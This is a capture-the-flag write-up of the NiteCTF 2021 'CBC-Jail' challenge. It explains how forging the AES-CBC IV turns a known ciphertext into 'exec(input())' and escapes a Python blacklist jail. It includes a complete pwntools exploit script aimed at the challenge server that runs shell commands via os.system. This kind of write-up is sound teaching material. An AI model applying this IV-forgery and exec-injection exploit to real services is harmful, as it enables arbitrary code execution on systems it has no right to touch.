---
author: xtylez
categories: ctf
date: 2021-12-13 20:00:00 +0100
layout: post
tags: [xtylez, crypto]
title: NiteCTF 2021 - CBC-Jail [Crypto/Pwn]
---

```
Solves: 34
Type:  	crypto/pwn
Difficulty: Easy
Author: Pun1sher + Arkaja

crack() the jail to get the flag. But make sure you get your crypto right.
```

## Introduction ##

This was a very fun challenge to solve from niteCTF which involved knowledge of how AES-CBC worked and how to bypass a blacklist made in python which didn't filter all the interesting functions we could `exec()`.

## Code analysis ##

As we open the file, we can see that we have three functions, `encrypt(msg), decrypt(msg,iv), weirdify(inp)`. which are all based on `AES-CBC 128bit` mode.

We can also see that the KEY and IV are randomly generated each time we open the connection to the server.

Also, we are given a "hint" by the challenge creator:

```python
print('Welcome to Prison.')
print('A mad cryptographer thought it would be cool to mess your shell up.')
print('Lets see if you can "crack()" your way out of here')
print("As a gift we'll give you a sample encryption")
print(encrypt(b'trapped_forever'))
```

Where `encrypt()` does the following:

```python
def encrypt(msg):
    msg = pad(msg,16)
    cipher = AES.new(KEY,AES.MODE_CBC,IV)
    encrypted = cipher.encrypt(msg)
    encrypted = encrypted.hex()
    msg = IV.hex() + encrypted
    return msg
```

Looks like the encryption is being done correctly and that we have the IV and Ciphertext, as we have the source we also have the Plaintext.

Now lets take a look at the `weirdify()` function:

```python
def weirdify(inp):
    iv = bytes.fromhex(inp[:32])
    msg = bytes.fromhex(inp[32:])
    command = decrypt(msg,iv)
    return command
```

Looks like we can manipulate the IV that is being used for decrypting the msg as it's being read from our input.

First I'll append two images so we can understand how AES-CBC works and why the IV is so important here.

![image alt](https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png "AES-CBC Encrypt")
![image alt](https://upload.wikimedia.org/wikipedia/commons/6/66/Cbc_decryption.png "AES-CBC Decrypt")

As we can see, the Plaintext is first XOR'ed with the IV and then ciphered with the KEY. Same for decryption, first we decrypt and then we XOR.

As we can manipulate the IV, we could try to modify it so when we send the same ciphertext which we already know it's plaintext, XOR's to our desired plaintext.

It can be done because `0 == A XOR A` and because `0 XOR A = A`. It's reversible operation.

So our objective will be to get a new IV like `NEWIV = PT ^ OURPT ^ OLDIV`.

## Exploit ##

First of all we get our input from IO, for that we'll use `pwntools`.

Then we will create our `transform()` function which will generate the desired decrypted plaintext.

```python
def transform(newmsg,iv):
	changeit = newmsg
	for i in range(16-len(newmsg)):
		changeit += b"\t"
	oldmsg = b"trapped_forever\t"
	oldxor = xor(oldmsg,changeit)
	newiv = xor(oldxor,iv[:16])
	return newiv
```

After we have this, we only have to think on how to bypass the filter, in our case we just added an `exec(input())` which bypassed the filter. Now we could just automate everything and it would end up like this:

```python
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def transform(newmsg,iv):
	changeit = newmsg
	for i in range(16-len(newmsg)):
		changeit += b"\t"
	oldmsg = b"trapped_forever\t"
	oldxor = xor(oldmsg,changeit)
	newiv = xor(oldxor,iv[:16])
	return newiv

LOCAL = False
IP = '34.147.79.216'
PORT = 1337

if LOCAL:
	IP = "127.0.0.1"
	PORT = 9001
	io = remote(IP,PORT)
else:
	io = remote(IP,PORT)
    
for i in range(5):
	print(io.recvline())
    
encrypted = io.recvline().decode().replace("\n","")
enctext = bytes.fromhex(encrypted[32:])
IV = bytes.fromhex(encrypted[:32])

print(f"IV: {IV}")
print(f"ENC: {enctext}")

io.sendline(transform(b"exec(input())",IV).hex() +enctext.hex())
io.sendline(b"os.system('ls')")
io.interactive()
```

And the result would be:

```
>>flag.txt
nite{Th3__gr3at_esc4p3}
server.py
```

[Challenge source code](https://github.com/eskardinha/CTF-Writeups/tree/master/2021/niteCTF/CBC-Jail)

